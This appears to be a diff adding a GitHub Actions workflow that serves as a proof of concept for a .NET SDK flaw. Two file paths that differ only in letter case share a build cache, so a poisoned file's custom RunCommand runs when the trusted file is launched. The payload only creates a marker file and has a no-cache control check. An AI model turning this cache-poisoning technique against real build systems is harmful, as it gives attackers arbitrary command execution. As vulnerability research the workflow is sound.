@@ -1,0 +1,97 @@
+name: SDK file-app arbitrary RunCommand cache collision
+
+on:
+  push:
+    branches:
+      - lab/kestrel-chunk-extensions-20260920
+    paths:
+      - '.github/workflows/sdk-fileapp-arbitrary-runcommand-collision.yml'
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  linux-arbitrary-command:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: 11.0.100-rc.1.26425.128
+
+      - name: Build-only poison with custom RunCommand
+        shell: bash
+        run: |
+          set -euxo pipefail
+          ROOT="$RUNNER_TEMP/sdk-fileapp-runcommand"
+          A="$ROOT/victim/Program.cs"
+          V="$ROOT/VICTIM/Program.cs"
+          MARKER="$RUNNER_TEMP/SDK_FILEAPP_RUNCOMMAND.marker"
+          rm -rf "$ROOT"; rm -f "$MARKER"
+          mkdir -p "$(dirname "$A")" "$(dirname "$V")"
+
+          cat > "$A" <<EOF
+          #:property RunCommand=/usr/bin/touch
+          #:property RunArguments=$MARKER
+          Console.WriteLine("ATTACKER_SOURCE_BODY_SHOULD_NOT_EXECUTE");
+          EOF
+
+          cat > "$V" <<'EOF'
+          Console.WriteLine("TRUSTED_VICTIM_EXECUTED");
+          EOF
+
+          touch -d '2020-01-01T00:00:00Z' "$A" "$V"
+
+          python3 - "$A" "$V" <<'PY'
+          import hashlib,sys
+          for p in sys.argv[1:]:
+              print(p, hashlib.sha256(p.upper().encode()).hexdigest())
+          print("CASE_NORMALIZED_PATHS_EQUAL=", sys.argv[1].upper()==sys.argv[2].upper())
+          PY
+
+          dotnet build "$A" > "$ROOT/build.out" 2> "$ROOT/build.err"
+          cat "$ROOT/build.out"; cat "$ROOT/build.err"
+
+          test ! -f "$MARKER"
+          echo "ARBITRARY_COMMAND_PRECONDITION=PASS_NO_COMMAND_EXECUTION_DURING_BUILD"
+
+          find "$HOME/.local/share/dotnet/runfile" -name build-success.cache -print -exec cat {} \; > "$ROOT/cache.txt" || true
+          cat "$ROOT/cache.txt"
+
+          rm -f "$MARKER"
+          dotnet run --file "$V" > "$ROOT/victim.out" 2> "$ROOT/victim.err"
+          cat "$ROOT/victim.out"; cat "$ROOT/victim.err"
+
+          if test -f "$MARKER" && ! grep -q 'TRUSTED_VICTIM_EXECUTED' "$ROOT/victim.out"; then
+            echo "ARBITRARY_COMMAND_RESULT=POISONED_RUNCOMMAND_EXECUTED"
+          else
+            echo "ARBITRARY_COMMAND_RESULT=FAILED"
+            exit 1
+          fi
+
+          rm -f "$MARKER"
+          dotnet run --file "$V" --no-cache > "$ROOT/nocache.out" 2> "$ROOT/nocache.err"
+          cat "$ROOT/nocache.out"; cat "$ROOT/nocache.err"
+
+          if grep -q 'TRUSTED_VICTIM_EXECUTED' "$ROOT/nocache.out" && ! test -f "$MARKER"; then
+            echo "ARBITRARY_COMMAND_NO_CACHE_CONTROL=TRUSTED_VICTIM_EXECUTED"
+          else
+            echo "ARBITRARY_COMMAND_NO_CACHE_CONTROL=FAILED"
+            exit 1
+          fi
+
+          cp "$ROOT/"*.out "$GITHUB_WORKSPACE/" || true
+          cp "$ROOT/"*.err "$GITHUB_WORKSPACE/" || true
+          cp "$ROOT/cache.txt" "$GITHUB_WORKSPACE/runcommand-cache.txt"
+
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: sdk-fileapp-arbitrary-runcommand
+          path: |
+            *.out
+            *.err
+            runcommand-cache.txt
